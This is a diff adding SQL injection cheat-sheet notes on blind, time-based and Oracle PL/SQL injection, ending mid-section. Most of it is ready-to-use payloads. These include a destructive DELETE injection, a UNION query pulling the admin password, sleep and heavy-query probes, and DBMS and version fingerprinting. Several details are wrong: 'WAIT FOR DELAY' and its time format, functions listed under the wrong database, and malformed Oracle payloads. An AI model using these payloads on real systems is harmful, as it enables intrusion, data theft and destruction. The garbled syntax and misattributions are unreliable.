@@ -148,3 +148,104 @@ ORDER BY injection payload examples:
 	-Extract column name from table
 ?parma=1&order=file_name((select top(1) column_name from table_name))
 	-Extract data from column of a table
+
+Injecting into anonymous PL\SQL blocks (Oracle)
+'; DELETE FROM products WHERE 'a'='a
+' AND 1=2 UNION SELECT password FROM members WHERE username='admin
+	-injection into dynamic cursors
+	
+Blind SQL Injection
+	2 basic types, time-based and error-based
+	time-based injections make boolean conditional statements on the evalution of which a delayed respose infers, commonly by setting
+		an arbitrary time delay or otherwise inducing an action that requires a sufficiently greater number of processing cycles to
+		complete than an expected http server response time
+	error-based injections conditionally return an error or non-random response indicative of an error response or erroneous value
+		on evaluation
+		--when a page is found to return an error consistent with sql statement evalution, as opposed to returning an error response
+			when injection payload escape (or other) characters are submitted as parameter values, that error can be conditionally
+			induced and the responses can be evaluated on a second order as boolean responses to sql statement evalution when an
+			injection must be exploited blind
+
+Condition Syntax
+MYSQL:
+IF(condition, when_true, when_false)
+	-used in syntax of a standard SQL statement, except stored procedures for which the syntax is identical to ORACLE/PL\SQL
+SQL Server:
+IF condition when_true [ELSE when_false]
+	-used in stored procedure or stacked query
+Oracle:
+IF condition THEN when_true [ELSE when_false] END IF
+	-only used in PL\SQL extension
+Pros/Cons of blind injections types:
+Time-based is less likely to leave logged traces of (error-returning) queries in log files.
+Time-based tends to be CPU and database connection thread intensive, which may causes errors or falsify results while retrieving responses at expected intervals.
+Error-based injection will usually complete execution of many requests significantly faster than time-delays.
+
+Time-Based Blind SQLi
+	Time-Delay Functions (by database)
+Mysql:
+SLEEP(#)
+BENCHMARK(count, expr)
+	--e.g. SELECT BENCHMARK(1000000,AES_ENCRYPT('hello','goodbye'));
+SQL Server:
+WAIT FOR DELAY 'hh,mm,ss'
+WAIT FOR TIME 'hh,mm,ss'
+ORACLE:
+BEGIN DBMS_LOCK.SLEEP(15); END;
+	-Oracle does not support stacked queries in dynamic SQL queries, statement only executed by dbms if SQL injection vulnerability in PL/SQL code or an anonymous PL/SQL block
+	--better to inject a Heavy Query instead of calling SLEEP() in Oracle, unlike other dbms
+	--only way to achieve time-base attacks in dynamic queries on Oracle
+Test for Time-based execution
+Mysql:
+=1-SLEEP(15)
+=1-BENCHMARK(100000000, rand())
+SQL Server:
+1; WAIT FOR DELAY '00:00:15'
+	WHERE Conditional
+	-Injected into queries stating roughly 'SELECT * FROM table_name WHERE column='
+1' OR sleep(2)--+-
+	Estimate table size stating WHERE Conditions
+	-This works because for each SELECT query executed by the database engine, all records returned by the statement are evaluated to validate they satisfy the WHERE clause condition.
+	--only works with MySQL(, because its time-delay function can be integrated to evaluate within SQL queries, as opposed to evaluating statically within a statement)
+1 AND 1=2 OR sleep(0.001)
+	-a response time consistent with standard server response time indicates that ether the parameter is not injectable or that a
+		table has very few columns
+1 AND 1=2 OR sleep(0.1)
+1 AND 1=2 OR sleep(1)
+	-deviation between response times evaluating sleep timers passed varying values should indicate an approximate size (in columns) of a table
+	Heavy Queries
+	-"heavy" queries are queries containing statements that will take noticeable time to get executed by the database engine
+SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C;
+	-standard heavy mysql query
+	--MS SQL Server and PostgreSQL queries follow the same syntactical rules
+1 AND 1>(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)
+1' OR 1>(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C);--+-
+	-generic mysql blind sqli heavy query
+SELECT count(*) FROM all_users A, all_users B, all_users C;
+	-standard heavy Oracle SQL query
+1 AND 1<SELECT count(*) FROM all_users A, all_users B, all_users C
+1' OR 1<SELECT count(*) FROM all_users A, all_users B, all_users C;--+-
+	Infering DBMS
+	--Determined by calling statements only available to one or few DBMS
+MySQL:
+POW(1,1)
+'abc' 'def'
+SQL Server:
+BITAND(1,1)
+'abc' + 'def'
+Oracle:
+SQUARE(1)
+'abc' || 'def'
+	Testing Database Version
+Mysql:
+1-IF(MID(VERSION(),1,1) = '5', SLEEP(15), 0)
+SQL Server:
+SELECT @@version
+1 UNION SELECT 1, 2, @@version
+1 AND 1=2 UNION SELECT 1, 2, @@version
+Oracle:
+SELECT banner FROM v$version WHERE rownum=1
+	Test User account:
+SQL Server:
+1; IF SYSTEM_USER='sa' WAIT FOR DELAY '00:00:15'
+ORACLE
